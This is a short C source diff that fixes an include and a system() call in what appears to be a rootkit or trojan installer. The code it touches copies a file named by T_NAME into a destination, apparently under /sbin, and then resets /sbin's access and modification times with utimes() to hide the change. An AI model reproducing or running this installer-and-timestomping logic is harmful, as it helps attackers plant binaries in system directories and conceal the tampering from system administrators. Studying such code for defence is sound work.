@@ -33,6 +33,7 @@
 #include <limits.h>
 #include <nlist.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <sys/time.h>
 #include <sys/types.h>
 #include <sys/stat.h>
@@ -124,7 +125,7 @@ main(int argc, char *argv[])
 
 	/* Copy T_NAME into DESTINATION. */
 	char string[] = "cp" " " T_NAME " " DESTINATION;
-	system(&string);
+	system(&string[0]);
 
 	/* Roll back /sbin/'s access and modification times. */
 	if (utimes("/sbin", (struct timeval *)&time) < 0) {
